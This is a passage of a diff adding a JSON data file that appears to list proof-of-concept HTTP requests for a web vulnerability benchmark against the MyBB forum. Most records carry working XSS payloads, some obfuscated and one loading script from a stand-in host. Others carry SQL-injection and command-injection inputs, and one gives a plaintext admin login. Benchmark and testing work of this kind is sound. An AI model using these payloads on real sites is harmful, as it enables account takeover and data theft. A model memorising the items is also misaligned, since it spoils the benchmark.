@@ -1,0 +1,1839 @@
+[
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/modcp.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "uid": [
+        "1"
+      ]
+    },
+    "request_id": "requests.67f7e4c385c1f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_09c44e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/misc.php",
+    "post_data": {
+      "action": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "document": [
+        "4-2"
+      ],
+      "keywords": [
+        "Enter Keywords"
+      ],
+      "name": [
+        "ZAP"
+      ],
+      "submit": [
+        "Search Help Documents"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6819ca3a4c1c3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_11844d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/memberlist.php",
+    "post_data": {
+      "$('[for": [
+        "username]').on('click', function(){"
+      ]
+    },
+    "query_params": {
+      "google": [
+        "default"
+      ],
+      "icq": [
+        "default"
+      ],
+      "order": [
+        "descending"
+      ],
+      "perpage": [
+        "15"
+      ],
+      "skype": [
+        "'"
+      ],
+      "sort": [
+        "referrals"
+      ],
+      "username": [
+        "alice"
+      ],
+      "website": [
+        "default"
+      ]
+    },
+    "request_id": "requests.681a129f85f36",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_137677",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/modcp.php",
+    "post_data": {
+      "if (value !": [
+        "= \"\") {"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "warninglogs"
+      ],
+      "filter[mod_username]": [
+        "alice"
+      ],
+      "filter[order]": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "filter[per_page]": [
+        "20"
+      ],
+      "filter[reason]": [
+        "default"
+      ],
+      "filter[sortby]": [
+        "dateline"
+      ],
+      "filter[username]": [
+        "alice"
+      ]
+    },
+    "request_id": "requests.681a129ccd2f0",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_1a32fa",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/usercp.php",
+    "post_data": {
+      "action": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "my_post_key": [
+        "e2ca09a87aad6160b770671714ce9a15"
+      ],
+      "oldpassword": [
+        "<img src=\"x\" onerror=\"xss(59988108)\">"
+      ],
+      "password": [
+        "<img src=\"x\" onerror=\"xss(59168885)\">"
+      ],
+      "password2": [
+        "<img src=\"x\" onerror=\"xss(82946346)\">"
+      ],
+      "submit": [
+        "Update Password"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67f7e4c2c5997",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_3398ba",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/memberlist.php",
+    "post_data": {
+      "$('[for": [
+        "username]').on('click', function(){"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "do_search"
+      ],
+      "author": [
+        "*/</script>'>alert(0xdeadbeef)/*<script/1='"
+      ],
+      "findthreadst": [
+        "1z"
+      ],
+      "forums[]": [
+        "all2"
+      ],
+      "keywords": [
+        ""
+      ],
+      "order": [
+        "descending<a href=\"javascript&colon;\\u0061&#x6C;&#101%72t&lpar;0xdeadbeef&rpar;\"><button>"
+      ],
+      "pddir": [
+        "0",
+        "1"
+      ],
+      "perpage": [
+        "-20"
+      ],
+      "postdate": [
+        "30"
+      ],
+      "postthread": [
+        ".1",
+        ".2"
+      ],
+      "showresults": [
+        "posts(",
+        "threads("
+      ],
+      "sort": [
+        "postnum}"
+      ],
+      "sortby": [
+        "location0;1"
+      ],
+      "sortordr": [
+        "asca",
+        "desca"
+      ],
+      "submit": [
+        "Searcheval(URL.slice(-8))>#alert(0xdeadbeef)"
+      ],
+      "uid": [
+        "1"
+      ],
+      "username": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ]
+    },
+    "request_id": "requests.6803e02444fb9",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_344755",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/xmlhttp.php",
+    "post_data": {},
+    "query_params": {
+      "_": [
+        "1744209924411"
+      ],
+      "action": [
+        "get_users"
+      ],
+      "query": [
+        "'"
+      ]
+    },
+    "request_id": "requests.67f7e47c93398",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_376d80",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/private.php",
+    "post_data": {
+      "action": [
+        "do_stuff"
+      ],
+      "fid": [
+        "<img src=\"x\" onerror=\"xss(49776664)\">"
+      ],
+      "fromfid": [
+        "0"
+      ],
+      "jumpto": [
+        "<img src=\"x\" onerror=\"xss(26680879)\">"
+      ],
+      "keywords": [
+        "'"
+      ],
+      "my_post_key": [
+        "c03487204c6ae178af63858dd1c94f38"
+      ],
+      "quick_search": [
+        "Search PMs"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67f7e47f282b9",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_3d3fcf",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/private.php",
+    "post_data": {
+      "action": [
+        "do_send"
+      ],
+      "bcc": [
+        "Hi there!"
+      ],
+      "do": [
+        "default"
+      ],
+      "icon": [
+        "7"
+      ],
+      "message": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "my_post_key": [
+        "329ae25e2dc1fb6a02f935020d94c62e"
+      ],
+      "options[disablesmilies]": [
+        "1"
+      ],
+      "options[readreceipt]": [
+        "1"
+      ],
+      "options[savecopy]": [
+        "1"
+      ],
+      "options[signature]": [
+        "1"
+      ],
+      "pmid": [
+        "0"
+      ],
+      "preview": [
+        "Preview"
+      ],
+      "saveasdraft": [
+        "Save as Draft"
+      ],
+      "subject": [
+        "default"
+      ],
+      "submit": [
+        "Send Message"
+      ],
+      "to": [
+        "Hi there!"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a129a3442d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_3d527e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/xmlhttp.php",
+    "post_data": {},
+    "query_params": {
+      "_": [
+        "1744209924411"
+      ],
+      "action": [
+        "get_users"
+      ],
+      "query": [
+        "\"><svg onload=alert(987890)//"
+      ]
+    },
+    "request_id": "requests.67f7e47c93398",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_42ccf9",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/member.php",
+    "post_data": {
+      "action": [
+        "\""
+      ],
+      "my_post_key": [
+        "cca9a86824f9f5688f59b6812bae16ec"
+      ],
+      "password": [
+        ""
+      ],
+      "remember": [
+        "yes"
+      ],
+      "submit": [
+        "Login"
+      ],
+      "url": [
+        ""
+      ],
+      "username": [
+        ""
+      ]
+    },
+    "query_params": {
+      "action": [
+        "do_search"
+      ],
+      "datecut": [
+        "71)"
+      ],
+      "fid": [
+        "&quot;;alert(0xdeadbeef);&quot;<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(0xdeadbeef)\"/>?2"
+      ],
+      "forums[]": [
+        "2isset()"
+      ],
+      "hid": [
+        "<!--><scRipT src=//deadbeef.com>43&apos;;alert(0xdeadbeef);&apos;alert(0xdeadbeef)"
+      ],
+      "keywords": [
+        ">>="
+      ],
+      "order": [
+        "&quot;;alert`0xdeadbeef`;&quot;5asc"
+      ],
+      "postthread": [
+        "1true"
+      ],
+      "sortby": [
+        "subject3"
+      ]
+    },
+    "request_id": "requests.6803e052885ea",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_4b3602",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/warnings.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "uid": [
+        "1"
+      ]
+    },
+    "request_id": "requests.67f7e486b87e6",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_4cd3dd",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/admin/index.php",
+    "post_data": {
+      "do": [
+        "login"
+      ],
+      "password": [
+        "xuefeng20011024"
+      ],
+      "username": [
+        "xuefeng20011024"
+      ]
+    },
+    "query_params": {
+      "module": [
+        "user-banning"
+      ],
+      "uid": [
+        "execute_code\"><script>alert(987890)</script>"
+      ]
+    },
+    "request_id": "requests.67f7e4981bdb9",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_574725",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/private.php",
+    "post_data": {
+      "action": [
+        "do_send"
+      ],
+      "bcc": [
+        "Hi there!"
+      ],
+      "do": [
+        "default"
+      ],
+      "icon": [
+        "7"
+      ],
+      "message": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "my_post_key": [
+        "329ae25e2dc1fb6a02f935020d94c62e"
+      ],
+      "options[disablesmilies]": [
+        "1"
+      ],
+      "options[readreceipt]": [
+        "1"
+      ],
+      "options[savecopy]": [
+        "1"
+      ],
+      "options[signature]": [
+        "1"
+      ],
+      "pmid": [
+        "0"
+      ],
+      "preview": [
+        "Preview"
+      ],
+      "saveasdraft": [
+        "Save as Draft"
+      ],
+      "subject": [
+        "default"
+      ],
+      "submit": [
+        "Send Message"
+      ],
+      "to": [
+        "Hi there!"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a129a3442d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_5baa5d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/memberlist.php",
+    "post_data": {
+      "$('[for": [
+        "username]').on('click', function(){"
+      ]
+    },
+    "query_params": {
+      "order": [
+        "ascending"
+      ],
+      "perpage": [
+        "20"
+      ],
+      "sort": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "username": [
+        "X"
+      ],
+      "username_match": [
+        "begins"
+      ]
+    },
+    "request_id": "requests.6804adda03e69",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_6bf376",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/private.php",
+    "post_data": {
+      "action": [
+        "do_send"
+      ],
+      "bcc": [
+        "Hi there!"
+      ],
+      "do": [
+        "default"
+      ],
+      "icon": [
+        "7"
+      ],
+      "message": [
+        "Hi there!"
+      ],
+      "my_post_key": [
+        "329ae25e2dc1fb6a02f935020d94c62e"
+      ],
+      "options[disablesmilies]": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "options[readreceipt]": [
+        "1"
+      ],
+      "options[savecopy]": [
+        "1"
+      ],
+      "options[signature]": [
+        "1"
+      ],
+      "pmid": [
+        "0"
+      ],
+      "preview": [
+        "Preview"
+      ],
+      "saveasdraft": [
+        "Save as Draft"
+      ],
+      "subject": [
+        "default"
+      ],
+      "submit": [
+        "Send Message"
+      ],
+      "to": [
+        "Hi there!"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a129a37e01",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_6f1a3e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/memberlist.php",
+    "post_data": {
+      "$('[for": [
+        "username]').on('click', function(){"
+      ]
+    },
+    "query_params": {
+      "order": [
+        "descending"
+      ],
+      "perpage": [
+        ")'"
+      ],
+      "sort": [
+        "regdate"
+      ]
+    },
+    "request_id": "requests.67f7e4939c01c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_733976",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/reputation.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "uid": [
+        "1"
+      ]
+    },
+    "request_id": "requests.67ff1896d26b9",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_75d21e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/member.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "logoutkey": [
+        "fed5b35f1299eb6a462f477bb1fdd4fb"
+      ]
+    },
+    "request_id": "requests.67f7e47f7f713",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_75f7f4",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/xmlhttp.php",
+    "post_data": {},
+    "query_params": {
+      "_": [
+        "1744209924411"
+      ],
+      "action": [
+        "get_users"
+      ],
+      "query": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ]
+    },
+    "request_id": "requests.67f7e47c93398",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_777aa9",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/moderation.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "pmid": [
+        ""
+      ]
+    },
+    "request_id": "requests.681b27b1563b2",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_7a66f9",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/xmlhttp.php",
+    "post_data": {},
+    "query_params": {
+      "_": [
+        "1744209924411"
+      ],
+      "action": [
+        "get_users"
+      ],
+      "query": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.67f7e47c93398",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_825e1f",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/memberlist.php",
+    "post_data": {
+      "$('[for": [
+        "username]').on('click', function(){"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ],
+      "author": [
+        "5"
+      ],
+      "findthreadst": [
+        "\\1"
+      ],
+      "forums[]": [
+        "all{"
+      ],
+      "keywords": [
+        "5"
+      ],
+      "matchusername": [
+        "'onload=alert(0xdeadbeef)><svg/1='1"
+      ],
+      "numreplies": [
+        "</script><svg onload=alert(0xdeadbeef)>"
+      ],
+      "order": [
+        "ascendingM"
+      ],
+      "pddir": [
+        "70",
+        "71"
+      ],
+      "perpage": [
+        "120"
+      ],
+      "postdate": [
+        "0"
+      ],
+      "postthread": [
+        "1<IMG SRC=\"jav\tascript:alert(0xdeadbeef);\">",
+        "2<IMG SRC=\"jav\tascript:alert(0xdeadbeef);\">"
+      ],
+      "showresults": [
+        "posts</rt>",
+        "threads</rt>"
+      ],
+      "sort": [
+        "lastvisit"
+      ],
+      "sortby": [
+        "lastpost"
+      ],
+      "sortordr[]": [
+        "asc",
+        "desc"
+      ],
+      "submit": [
+        "Search"
+      ]
+    },
+    "request_id": "requests.6803dffa561f9",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_8767c6",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/calendar.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "calendar": [
+        "1"
+      ],
+      "day": [
+        "15"
+      ],
+      "month": [
+        "4"
+      ],
+      "year": [
+        "2025"
+      ]
+    },
+    "request_id": "requests.67f7e49560ddd",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_8f1dda",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/misc.php",
+    "post_data": {
+      "email": [
+        "boolean-71"
+      ],
+      "forums[]": [
+        "all"
+      ],
+      "from": [
+        "in\" $a\""
+      ],
+      "limit": [
+        "15"
+      ],
+      "make": [
+        "Generate Syndication URL"
+      ],
+      "my_post_key": [
+        "56986c279f31fadf80c74d453a341af5f(,"
+      ],
+      "subject[]": [
+        "Z</pre>"
+      ],
+      "version": [
+        "ls '"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "syndication"
+      ],
+      "order": [
+        "descending"
+      ],
+      "perpage": [
+        "20"
+      ],
+      "sort": [
+        "referrals"
+      ],
+      "username": [
+        "Z"
+      ]
+    },
+    "request_id": "requests.67ff189c9acea",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_9346ce",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/contact.php",
+    "post_data": {
+      "<td class": [
+        "\"trow2\" align=\"right\"><a href=\""
+      ],
+      "gt;\"><span class": [
+        "\"smalltext\">Click here if you don't want to wait any longer.</span></a></td>"
+      ],
+      "gt;alert(987890)": [
+        ""
+      ],
+      "lt;/script": [
+        ""
+      ],
+      "lt;script": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67f7e494eccf2",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_a19f7c",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/private.php",
+    "post_data": {
+      "action": [
+        "do_search"
+      ],
+      "folder[]": [
+        "1"
+      ],
+      "keywords": [
+        "default"
+      ],
+      "message": [
+        "1"
+      ],
+      "my_post_key": [
+        "329ae25e2dc1fb6a02f935020d94c62e"
+      ],
+      "sender": [
+        "sqli@%27"
+      ],
+      "sort": [
+        "dateline"
+      ],
+      "sortordr": [
+        "desc"
+      ],
+      "status[forwarded]": [
+        "1"
+      ],
+      "status[new]": [
+        "1"
+      ],
+      "status[read]": [
+        "1"
+      ],
+      "status[replied]": [
+        "1"
+      ],
+      "subject": [
+        "1"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a129d36132",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_a4870f",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/search.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "do_search"
+      ],
+      "forums[]": [
+        "2"
+      ],
+      "keywords": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "postthread": [
+        "1"
+      ]
+    },
+    "request_id": "requests.67f7e480233b3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_a728af",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/modcp.php",
+    "post_data": {
+      "<td class": [
+        "\"trow2\">N/A</td>"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "iplookup"
+      ],
+      "ipaddress": [
+        "\""
+      ]
+    },
+    "request_id": "requests.6823836e96a16",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_aa6862",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/private.php",
+    "post_data": {
+      "action": [
+        "do_send"
+      ],
+      "bcc": [
+        "Hi there!"
+      ],
+      "do": [
+        "default"
+      ],
+      "icon": [
+        "7"
+      ],
+      "message": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "my_post_key": [
+        "329ae25e2dc1fb6a02f935020d94c62e"
+      ],
+      "options[disablesmilies]": [
+        "1"
+      ],
+      "options[readreceipt]": [
+        "1"
+      ],
+      "options[savecopy]": [
+        "1"
+      ],
+      "options[signature]": [
+        "1"
+      ],
+      "pmid": [
+        "0"
+      ],
+      "preview": [
+        "Preview"
+      ],
+      "saveasdraft": [
+        "Save as Draft"
+      ],
+      "subject": [
+        "default"
+      ],
+      "submit": [
+        "Send Message"
+      ],
+      "to": [
+        "Hi there!"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a129a3442d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_b61b7a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/private.php",
+    "post_data": {
+      "action": [
+        "10,9,8'"
+      ],
+      "allbox": [
+        "</title></option><script>xss(28255752)</script>"
+      ],
+      "fid": [
+        "</title></option><script>xss(76143720)</script>"
+      ],
+      "fromfid": [
+        "0"
+      ],
+      "hop": [
+        "Go!"
+      ],
+      "jumpto": [
+        "</title></option><script>xss(39779966)</script>"
+      ],
+      "keywords": [
+        "etaajdmq"
+      ],
+      "my_post_key": [
+        "c03487204c6ae178af63858dd1c94f38"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67f7e482d4093",
